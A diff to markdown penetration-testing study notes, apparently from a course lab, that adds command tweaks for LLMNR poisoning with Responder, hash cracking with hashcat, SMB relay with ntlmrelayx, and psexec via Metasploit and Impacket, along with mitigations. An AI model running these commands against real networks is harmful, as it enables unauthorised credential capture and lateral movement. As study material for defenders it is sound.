@@ -421,11 +421,17 @@ Key flaw is that capturing traffic gives us a name and hash. (Man in the middle 
 Steps:
 - Edit and run responder
   - `sudo mousepad /etc/responder/Responder.conf` *(Make sure all options are on)*
-  - `sudo responder -I eth0 -dP`
+  - `sudo responder -I eth0 -dPv` on vpn `sudo responder -I tun0 -dPv`
 - An event occurs...
 - Get dem hashes
 - Crack dem hashes
   - `hashcat -m [mode] hashes/hashes.txt rockyou.txt`
+  - If hash already cracked:
+    - `hashcat -m [mode] hashes/hashes.txt rockyou.txt --show`
+  - If doesn't work *(only if on VM)*:
+    - `hashcat -m [mode] hashes/hashes.txt rockyou.txt --force`
+  - On metal, always run:
+    - `hashcat -m [mode] hashes/hashes.txt rockyou.txt -O`
 
 Mitigation:
 - Disable LLMNR & NBT-NS
@@ -445,7 +451,7 @@ Steps:
   - `nmap --script=smb2-security-mode.nse -p445 xxx.xxx.xxx.0/24` *(Add -Pn for better probing)*
 - Edit and run responder
   - `sudo mousepad /etc/responder/Responder.conf` *(Make sure HTTP & SMB are off)*
-  - `sudo responder -I eth0 -dP`
+  - `sudo responder -I eth0 -dPv` on vpn `sudo responder -I tun0 -dPv`
 - Setup ntlmrelayx
   - `sudo ntlmrelayx.py -tf targets.txt -smb2support --no-wcf-server --no-raw-server --no-winrm-server --no-rpc-server`
 - An event occurs...
@@ -467,9 +473,11 @@ Mitigation:
 
 Metasploit - with password
 - `use exploit/windows/smb/psexec`
+  - `show targets` can be useful
 
 Metasploit - with hash
 - `use exploit/windows/smb/psexec`
+  - `show targets` can be useful
 
 psexec.py - with password
 - `psexec.py marvel.local/fcastle:'P@$$w0rd!'@xxx.xxx.xxx.xxx`
